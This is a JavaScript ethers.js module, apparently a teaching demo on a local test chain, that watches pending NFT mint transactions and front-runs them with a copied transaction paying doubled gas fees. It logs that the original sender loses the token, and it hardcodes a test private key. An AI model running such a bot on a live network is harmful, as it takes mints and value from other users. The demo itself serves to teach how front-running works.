import { ethers, getBigInt } from "ethers";

// 1. 创建provider
let url = "ws://127.0.0.1:8545";
const provider = new ethers.WebSocketProvider(url);
let network = provider.getNetwork();

// 2.构建contract实例
const contractABI = [
    "function mint() external",
    "function ownerOf(uint256) external view returns (address)",   
    "function totalSupply() view returns (uint256)", 
]
const contractAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
const contractFM = new ethers.Contract(contractAddress, contractABI, provider)

// 3. 创建interface对象，用于解码交易详情
const iface = new ethers.Interface(contractABI)
function getSignature(fn) {
    return iface.getFunction("mint").selector
}

// 创建抢跑钱包
const privateKey = "0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6"
const wallet = new ethers.Wallet(privateKey, provider)

// 正常构建mint交易
const NormalTxMain = async() => {
    provider.on("pending", async(txHash) => {
        provider.getTransaction(txHash).then(
            async(tx) => {
                if(tx.data.indexOf(getSignature("mint")) !== -1) {
                    console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}`)
                    console.log(`铸造发起的地址是:${tx.from}`)//打印交易发起地址
                    await tx.wait()
                    const tokenId = await contractFM.totalSupply()
                    console.log(`mint的NFT编号是:${tokenId}`)
                    // 打印nft持有者地址
                    console.log(`编号${tokenId}NFT的持有者是${await contractFM.ownerOf(tokenId)}`)
                    // 比较二者的地址是否一致
                    console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(tokenId)}`)
                }
            }
        )
    })
}


const FrontRunMainV2 = async() => { 
    // network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] 连接到 chain ID ${res.chainId}`));
    console.log(`\n2. 抢跑钱包地址: ${wallet.address}`)
    provider.on('pending', async(txHash) => {
        const tx = await provider.getTransaction(txHash)
        if(tx.data.indexOf(getSignature('mint')) !== -1 && tx.from !== wallet.address) {
            console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}\n准备抢先交易`)
            const frontRunTx = {
                to: tx.to,
                value: tx.value,
                maxPriorityFeePerGas: BigInt(tx.maxPriorityFeePerGas.toString()) * 2n,
                maxFeePerGas: BigInt(tx.maxFeePerGas.toString()) * 2n,
                gasLimit: BigInt(tx.gasLimit.toString()) * 2n,
                data: tx.data
            }
            const aimTokenId = (await contractFM.totalSupply()) + 1n
            //打印应该被mint的nft编号
            console.log(`即将被mint的NFT编号是:${aimTokenId}`)
            console.log(`frontrun交易数据结构是: ${frontRunTx.to}`)
            const sentFR = await wallet.sendTransaction(frontRunTx)
            console.log(`正在frontrun交易`)
            const receipt = await sentFR.wait()
            console.log(`frontrun 交易成功,交易hash是:${receipt.transactionHash}`)
            console.log(`铸造发起的地址是:${tx.from}`)
            //刚刚mint的nft持有者并不是tx.from
            console.log(`编号${aimTokenId}NFT的持有者是${await contractFM.ownerOf(aimTokenId)}`)
            //tx.from被wallet.address抢跑，mint了下一个nft
            console.log(`编号${aimTokenId + 1n}的NFT的持有者是:${await contractFM.ownerOf(aimTokenId + 1n)}`)
            //比对地址，tx.from被抢跑
            console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(aimTokenId)}`)
            //检验区块内数据结果
            const block = await provider.getBlock(tx.blockNumber)
            console.log(`区块内交易数据明细:${block.transactions}`)//在区块内，后发交易排在先发交易前，抢跑成功。
        }   
    });
}

export {
    FrontRunMainV2,
    NormalTxMain
}